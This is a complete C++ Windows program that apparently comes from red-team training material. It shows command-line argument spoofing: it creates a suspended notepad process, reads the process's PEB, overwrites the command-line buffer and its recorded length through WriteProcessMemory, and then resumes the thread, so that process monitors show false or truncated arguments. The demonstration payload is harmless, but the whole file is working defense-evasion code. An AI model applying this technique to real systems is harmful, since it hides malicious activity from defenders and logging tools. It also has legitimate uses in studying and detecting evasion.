#include <iostream>
#include <Windows.h>
#include <winternl.h>

typedef NTSTATUS(WINAPI * NtQueryInformationProcess_t)(
	IN HANDLE,
	IN PROCESSINFOCLASS,
	OUT PVOID,
	IN ULONG,
	OUT PULONG
	);

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
int main(int argc, char ** argv) {
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	CONTEXT context;
	BOOL success;
	PROCESS_BASIC_INFORMATION pbi;
	DWORD retLen;
	SIZE_T bytesRead;
	SIZE_T bytesWritten;
	PEB pebLocal;
	RTL_USER_PROCESS_PARAMETERS parameters = { sizeof(parameters) };

	// Start process suspended
	success = CreateProcessA(
							NULL, 
							(LPSTR) "notepad.exe c:\\windows\\system32\\kernel32.dll", 
							NULL, 
							NULL, 
							FALSE, 
							CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
							NULL, 
							"C:\\Windows\\System32\\", 
							&si, 
							&pi);

	if (success == FALSE) {
		printf("Could not call CreateProcess\n");
		return 1;
	}

	// Retrieve information on PEB location in process
	NtQueryInformationProcess_t NtQueryInformationProcess_p = (NtQueryInformationProcess_t) GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryInformationProcess");
	NtQueryInformationProcess_p(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);

	// Read the PEB from the target process
	success = ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &pebLocal, sizeof(PEB), &bytesRead);
	if (success == FALSE) {
		printf("Could not call ReadProcessMemory to grab PEB\n");
		return 1;
	}

	// Grab the ProcessParameters from PEB
	ReadProcessMemory(pi.hProcess, pebLocal.ProcessParameters, &parameters, sizeof(parameters), &bytesRead);
	
	// Set the actual arguments we are looking to use
	WCHAR spoofedArgs[] = L"notepad.exe c:\\RTO\\boom.txt\0";
	success = WriteProcessMemory(pi.hProcess, parameters.CommandLine.Buffer, (void *) spoofedArgs, sizeof(spoofedArgs), &bytesWritten);
	if (success == FALSE) {
		printf("Could not call WriteProcessMemory to update commandline args\n");
		return 1;
	}
	
	//printf("STOP! I DARE YOU!\n"); getchar();
	
	// Below we can see an example of truncated output in ProcessHacker and ProcessExplorer and Task Manager

	// Update the CommandLine length (Remember, UNICODE length here)
	DWORD newUnicodeLen = 22;
	
	success = WriteProcessMemory(pi.hProcess, 
								(char *) pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length), 
								(void *) &newUnicodeLen, 
								4,
								&bytesWritten
								);
	if (success == FALSE) {
		printf("Could not call WriteProcessMemory to update commandline arg length\n");
		return 1;
	}

	printf("Hitme!\n");	getchar();

	// Resume thread execution*/
	ResumeThread(pi.hThread);
}
